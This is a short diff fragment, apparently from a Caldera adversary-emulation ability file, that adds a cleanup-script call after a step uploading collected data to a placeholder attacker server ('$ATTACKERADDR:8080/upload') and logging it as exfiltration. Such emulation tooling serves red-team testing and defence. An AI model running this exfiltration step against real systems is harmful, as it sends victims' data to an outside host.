@@ -16,7 +16,8 @@
             --data-path "$DATA_PATH" \
             --server-url "http://$ATTACKERADDR:8080/upload" \
             > "$DATA_PATH/KC2/analysis/exfiltration.log" 2>&1 \
-          && echo kc2-27-done
+          && echo kc2-27-done \
+          && /opt/caldera/KC2/caldera-agent-cleanup.py --async
         timeout: 900
         parsers:
           plugins.stockpile.app.parsers.basic:
